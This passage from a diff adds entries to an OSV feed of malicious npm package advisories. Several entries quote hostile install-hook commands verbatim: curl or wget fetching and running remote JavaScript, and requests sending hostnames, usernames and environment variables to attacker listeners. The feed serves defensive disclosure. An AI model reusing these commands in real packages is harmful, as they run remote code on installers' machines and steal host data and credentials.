href="https://www.npmjs.com/package/date-format-helper2/v/1.0.0"&gt;https://www.npmjs.com/package/date-format-helper2/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6301"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6293: Malicious code in airbnb-airlock (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6293</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6293"/>
+    <published>2026-06-23T14:11:48Z</published>
+    <updated>2026-06-23T14:31:21Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in airbnb-airlock (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;airbnb-airlock&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (034fd98a2ccd98f2bec2201d130c5a102ad17907c37af34b5162592e26a0fd43)
+The package&amp;#x27;s preinstall lifecycle hook in package.json runs `curl https://poc.amanrawat.com/hehe.js -o index.js &amp;amp;&amp;amp; node index.js`, fetching an unpinned JavaScript file from poc.amanrawat.com and immediately executing it with node during `npm install`. The fetched content is mutable and entirely controlled by the operator of that domain — installers run whatever bytes are served at install time, with no hash or signature verification. The package ships no other functional content; the remote fetch-and-execute is its only behavior. The package name uses the &amp;#x27;airbnb-&amp;#x27; prefix to impersonate the Airbnb open-source namespace while being pub…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/airbnb-airlock/v/99.0.0"&gt;https://www.npmjs.com/package/airbnb-airlock/v/99.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6293"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6291: Malicious code in @outmarket/ui (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6291</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6291"/>
+    <published>2026-06-23T14:12:09Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @outmarket/ui (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@outmarket/ui&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7241a2e167db383267fa82ce9660a44f7bcca4b6d4f11bb7ca85eaa6b432a47e)
+package.json declares a postinstall script that runs automatically on `npm install` and performs `require(&amp;#x27;https&amp;#x27;).get(...)` to a Burp Collaborator subdomain (`7rzjsf29azci2qjsm6kxt23ag1mtanyc.oastify.com`), passing `os.hostname()` and `os.userInfo().username` as query parameters. Any developer or build system installing this package leaks host identity to an external attacker-controlled OAST endpoint. The package&amp;#x27;s own description (`PENTEST-PoC: Dependency confusion - SecurifyAI engagement 2026-06-23`) and the version `9.9.9` published under the `@outmarket` scope indicate the package is designed to win resolution against an internal …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@outmarket/ui/v/9.9.9"&gt;https://www.npmjs.com/package/@outmarket/ui/v/9.9.9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6291"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6292: Malicious code in @outmarket/utils (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6292</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6292"/>
+    <published>2026-06-23T14:12:09Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @outmarket/utils (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@outmarket/utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (2cd90f0d706cda01a5740f120f6e8d22ae57d907a5000854439c201b3c53a8c0)
+package.json declares a postinstall lifecycle script that fires automatically on `npm install`. The inline `node -e` payload uses hex-encoded property names (`\x6f\x73` for `os`, `\x68\x6f\x73\x74\x6e\x61\x6d\x65` for `hostname`, `\x75\x73\x65\x72\x49\x6e\x66\x6f` for `userInfo`) to obscure that it reads `os.hostname()` and `os.userInfo().username`, then issues an HTTP GET to `http://208.87.128.25:8888/?h=&amp;lt;hostname&amp;gt;&amp;amp;u=&amp;lt;username&amp;gt;`. The destination is a bare IPv4 over cleartext HTTP — not a publisher domain or known infrastructure. The package is published under the `@outmarket` scope with a description identifying it as a dependency-con…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@outmarket/utils/v/9.9.9"&gt;https://www.npmjs.com/package/@outmarket/utils/v/9.9.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@outmarket/utils/v/9.9.10"&gt;https://www.npmjs.com/package/@outmarket/utils/v/9.9.10&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6292"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6298: Malicious code in ttal2ttml (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6298</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6298"/>
+    <published>2026-06-23T14:11:40Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ttal2ttml (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ttal2ttml&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (29387ac35a2248ad2e4b287b8c082f8d1a8d03b4937fc84a5b81fb85697e19d4)
+package.json declares a preinstall lifecycle script that runs `node -e &amp;quot;try{require(&amp;#x27;child_process&amp;#x27;).execSync(&amp;#x27;curl -sf https://d1ugk469z93e.0ac.io/callback.js | node&amp;#x27;,{stdio:&amp;#x27;ignore&amp;#x27;})}catch(e){}&amp;quot;`. On every `npm install`, the package fetches an unpinned JavaScript payload from the anonymous subdomain d1ugk469z93e.0ac.io and pipes it into `node`, executing whatever bytes the host returns under the installer&amp;#x27;s user account. Errors are swallowed via try/catch and stdio:&amp;#x27;ignore&amp;#x27; to hide failures. The destination is not the publisher&amp;#x27;s domain and the package&amp;#x27;s nominal purpose (TTML conversion) requires no network access. The package is al…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ttal2ttml/v/99.0.1"&gt;https://www.npmjs.com/package/ttal2ttml/v/99.0.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ttal2ttml/v/99.0.3"&gt;https://www.npmjs.com/package/ttal2ttml/v/99.0.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ttal2ttml/v/99.0.2"&gt;https://www.npmjs.com/package/ttal2ttml/v/99.0.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6298"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6297: Malicious code in tree-sitter-forth (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6297</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6297"/>
+    <published>2026-06-23T14:10:12Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in tree-sitter-forth (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;tree-sitter-forth&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (16f52e13ffb66b20f7c3dca7022e8115dbce1f39264638d38b73d6488e4cbf27)
+Package is a dependency-confusion lure: it claims version 9999.99.99 with description &amp;#x27;npm 404 error referenced in AlexanderBrevig/tree-sitter-forth&amp;#x27;, engineered to win resolution when an internal build references a non-existent public package of this name. index.js is a hollow re-export (`module.exports = require(&amp;#x27;tree-sitter-forth&amp;#x27;)`) while postinstall.js fires the actual payload. On `npm install`, postinstall.js collects host identity (os.hostname(), Node/OS versions, package name+version), probes 16 CI provider environment variables, harvests GitHub workflow/repo/owner env vars, and reads the configured npm registry URL, then POSTs…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/tree-sitter-forth/v/9999.99.99"&gt;https://www.npmjs.com/package/tree-sitter-forth/v/9999.99.99&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6297"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6277: Malicious code in search-from-search (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6277</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6277"/>
+    <published>2026-06-23T06:10:51Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-fgqv-2jmm-2p39"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in search-from-search (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fgqv-2jmm-2p39&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;search-from-search&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (06e2e600c7cba50d7cc3cbff52a18f77e508ec66be3a50cd4960f84771598548)
+package.json registers `node callback.js` as both `preinstall` and `postinstall`, so the payload runs automatically on `npm install`. callback.js collects the full `process.env` (with an in-source comment explicitly stating no masking), the user/uid/gid/homedir/shell, hostname, platform, cwd, local and external IP (via https://api.ipify.org), and CI environment indicators, then POSTs the JSON payload over plain HTTP to the hardcoded endpoint `http://132.243.20.244:8000/api/collect`. The outbound request sets `User-Agent: dependency-confusion/${PACKAGE_NAME}` and the published version `999.99.99` matches the canonical dependency-confusi…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fgqv-2jmm-2p39"&gt;https://github.com/advisories/GHSA-fgqv-2jmm-2p39&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/search-from-search/v/999.99.99"&gt;https://www.npmjs.com/package/search-from-search/v/999.99.99&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6277"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6296: Malicious code in myebaynode (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6296</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6296"/>
+    <published>2026-06-23T14:09:56Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in myebaynode (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;myebaynode&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (12d56c05672731322d45fb9273fb782a6b8042260fb019b2d96c755eed084fc3)
+package.json declares a preinstall lifecycle hook that runs `curl https://poc.amanrawat.com/hehe.js -o index.js &amp;amp;&amp;amp; node index.js`, fetching JavaScript from an external, mutable, personal domain and immediately executing it under the installer&amp;#x27;s user account on `npm install`. The fetched payload is unpinned (no hash or signature verification), can be changed by the host&amp;#x27;s owner at any time, and runs with full filesystem and network access of the installing user. The package name &amp;#x27;myebaynode&amp;#x27; with description &amp;#x27;Ebay Node Package&amp;#x27;, version 99.0.0, and minimal metadata (author &amp;#x27;aman&amp;#x27;, no repository) suggests brand-impersonation intended to …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/myebaynode/v/99.0.0"&gt;https://www.npmjs.com/package/myebaynode/v/99.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6296"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6295: Malicious code in kdrive-utils (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6295</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6295"/>
+    <published>2026-06-23T14:10:49Z</published>
+    <updated>2026-06-23T14:31:20Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in kdrive-utils (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;kdrive-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (3e7d5af5ddf22d4481fca4847a45189e6160a723341b32dcbb6bf51b49f53943)
+package.json declares a preinstall lifecycle script that auto-executes on `npm install` and runs `wget -q -O- &amp;quot;http://d8svb0ao12pnoovdaih0giunhdew5oqa4.oast.live/$(hostname)/$(whoami)&amp;quot;`. The installer&amp;#x27;s hostname and current OS username are embedded directly into the request path and sent over plain HTTP to an oast.live (Interactsh / out-of-band application security testing) listener — an attacker-controlled DNS/HTTP collector commonly used for supply-chain reconnaissance and typosquat/dependency-confusion probes. The package is an unscoped name published at version 99.9.9, which is the canonical dependency-confusion shape (high version…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/kdrive-utils/v/99.9.9"&gt;https://www.npmjs.com/package/kdrive-utils/v/99.9.9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6295"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6294: Malicious code in cue-mcp (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6294</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6294"/>
+    <published>2026-06-23T14:10:26Z</published>
+    <updated>2026-06-23T14:31:19Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cue-mcp (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cue-mcp&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (5dce71f7cd453bd73a138279dd78ebc607d7c4f6b171bd3b76c7f456a6eb907a)
+The package&amp;#x27;s postinstall.js script runs automatically on `npm install` and collects host identifying data (os.hostname()) along with process environment variables (process.env), then transmits the data over HTTPS. This shape — system-information harvesting at install time and outbound network transmission via the `https` module — is a classic install-time exfiltration pattern. There is no legitimate purpose served by reading the installer&amp;#x27;s environment variables and hostname during postinstall for a package of this kind. Environment variables on developer and CI machines routinely contain credentials (NPM_TOKEN, GITHUB_TOKEN, AWS keys…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/cue-mcp/v/9999.99.99"&gt;https://www.npmjs.com/package/cue-mcp/v/9999.99.99&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6294"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6225: Malicious code in new-eslint-1 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6225</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6225"/>
+    <published>2026-06-19T14:24:00Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-72jg-rrr3-v685"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-eslint-1 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-72jg-rrr3-v685&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-eslint-1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7752e7f074edbf8521da2ee0b7c68c28a2f76d86576138df8f18e08aaa3a5c38)
+Package is published as &amp;#x27;new-eslint-1&amp;#x27; but its package.json description, README, repository URL (MikeMcl/big.js), and source are a verbatim copy of big.js v7.0.1 — there is no ESLint functionality. Two lines have been injected at module top level in both big.js and big.mjs (lines 605-606): `const helper = require(&amp;quot;ts-eslint-helper&amp;quot;); helper.from_str().then(e =&amp;gt; e).catch(e =&amp;gt; { });`. Because package.json declares `&amp;quot;main&amp;quot;: &amp;quot;big.js&amp;quot;`, any `require(&amp;#x27;new-eslint-1&amp;#x27;)` synchronously loads the external `ts-eslint-helper` package and invokes `helper.from_str()` in the consumer&amp;#x27;s Node process, with errors silently swallowed. The required module n…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/new-eslint-1/v/7.0.6"&gt;https://www.npmjs.com/package/new-eslint-1/v/7.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-72jg-rrr3-v685"&gt;https://github.com/advisories/GHSA-72jg-rrr3-v685&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6225"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6226: Malicious code in new-mjs-eslint (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6226</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6226"/>
+    <published>2026-06-19T14:24:05Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-m6jq-gwpx-8rj7"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-mjs-eslint (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-m6jq-gwpx-8rj7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-mjs-eslint&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (b4ae24b182a00059424b8ea4800927bbbf662f0e6bf20264af611d37203a3f2e)
+Package is published under the unrelated name &amp;#x27;new-mjs-eslint&amp;#x27; but ships a verbatim copy of the big.js decimal-arithmetic library (original MikeMcl/big.js header, README, and source). Both main entrypoints, big.js and big.mjs, contain an injected line at lines 605-606: `const helper = require(&amp;quot;new-ts-helper&amp;quot;); helper.from_str().then(e =&amp;gt; e).catch(e =&amp;gt; { });`. This fires on every require()/import of the package, loads the sibling dependency new-ts-helper, invokes its from_str() function, and silently swallows any error. The package name does not match its advertised content (eslint-shaped name, big.js content), the injected call sits mi…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/new-mjs-eslint/v/7.0.6"&gt;https://www.npmjs.com/package/new-mjs-eslint/v/7.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-m6jq-gwpx-8rj7"&gt;https://github.com/advisories/GHSA-m6jq-gwpx-8rj7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6226"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6227: Malicious code in new-ts-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6227</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6227"/>
+    <published>2026-06-19T14:13:34Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-g793-594c-6gxf"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-ts-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-g793-594c-6gxf&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-ts-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (c3721ae4cecdfa22793382d07d28a25ba5fabd54ac405cb94e642a1f96faee80)
+index.js imports child_process and at lines 101 and 117 invokes execSync to run bash and zsh commands. Lines 9, 194, and 195 use Buffer.from(..., &amp;#x27;base64&amp;#x27;).toString() to decode base64-encoded payloads, a common pattern for hiding the actual shell commands from casual review. The combination of base64-decoded strings being fed into execSync calls inside the main module is the canonical shape of an obfuscated runtime payload executor: any caller that requires this package, or any lifecycle/CLI path that loads index.js, will execute attacker-controlled shell commands decoded from the embedded base64 blobs. There is no documented benign re…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/new-ts-helper/v/9.0.2"&gt;https://www.npmjs.com/package/new-ts-helper/v/9.0.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-g793-594c-6gxf"&gt;https://github.com/advisories/GHSA-g793-594c-6gxf&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6227"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6285: Malicious code in new-solt (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6285</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6285"/>
+    <published>2026-06-23T12:15:37Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-mvjp-c9p2-37jx"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-solt (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-mvjp-c9p2-37jx&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-solt&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (0cb151695f19820479204dd7c0cc067a235aaffbb89340888bd79a39b8e6070c)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mvjp-c9p2-37jx"&gt;https://github.com/advisories/GHSA-mvjp-c9p2-37jx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6285"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6284: Malicious code in new-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6284</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6284"/>
+    <published>2026-06-23T12:15:37Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-26mv-fx88-4qj7"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in new-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-26mv-fx88-4qj7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;new-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (cabb68bd9f2c4312904814f7c0c11aae7f93772a5c46c28a1ca8292592c83a53)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-26mv-fx88-4qj7"&gt;https://github.com/advisories/GHSA-26mv-fx88-4qj7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6284"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6282: Malicious code in local-ip-helper (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6282</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6282"/>
+    <published>2026-06-23T12:05:04Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-xg4m-w887-cp89"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in local-ip-helper (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-xg4m-w887-cp89&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;local-ip-helper&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (62edd1422ec623ef603b4c1d5bf898041000bb1a55470dc798519bdb4e0452b5)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-xg4m-w887-cp89"&gt;https://github.com/advisories/GHSA-xg4m-w887-cp89&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6282"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6287: Malicious code in poly-utils (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6287</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6287"/>
+    <published>2026-06-23T12:15:37Z</published>
+    <updated>2026-06-23T13:32:58Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-ffmg-f668-6cj8"/>
